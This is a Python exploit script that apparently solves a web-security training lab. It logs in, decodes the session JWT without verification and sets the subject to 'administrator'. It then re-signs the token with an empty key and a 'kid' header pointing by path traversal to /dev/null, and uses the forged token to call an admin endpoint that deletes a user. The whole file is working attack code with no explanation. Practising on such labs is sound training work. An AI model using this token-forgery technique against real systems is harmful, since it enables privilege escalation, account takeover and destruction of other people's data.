import requests as rq
import subprocess
from bs4 import BeautifulSoup
import jwt, json
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

def delete_carlos(modified_token):
    cookies = {"session": modified_token}
    delete_url = f"{BASE}/admin/delete?username=carlos"

    r = rq.get(delete_url, cookies=cookies)

    if r.status_code == 200:
        print("[+] Done!")
    else:
        print(f"[-] Failed: {r.status_code}")

BASE = "https://0ab3004a040fc3ad8099b7af0000002d.web-security-academy.net/"
LOGIN = f"{BASE}/login"

s = rq.Session()

r = s.get(LOGIN)
soup = BeautifulSoup(r.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

resp = s.post(LOGIN, data={
    "csrf": csrf,
    "username": "wiener",
    "password": "peter"
})

print("[+] Status:", resp.status_code)

jwt_token = s.cookies.get("session")

decode_token = jwt.decode(jwt_token, options={"verify_signature": False})
decode_header = jwt.get_unverified_header(jwt_token)
algorithm = decode_header["alg"]
print(f"[+] Decode token: {decode_token}\n")


decode_token['sub'] = 'administrator'
print(f"[+] Modified payload: {decode_token}\n")

modified_token = jwt.encode(decode_token, '', algorithm=algorithm, headers={"kid": "../../../dev/null"})
print(f"[+] Modified token: {modified_token}\n")

delete_carlos(modified_token)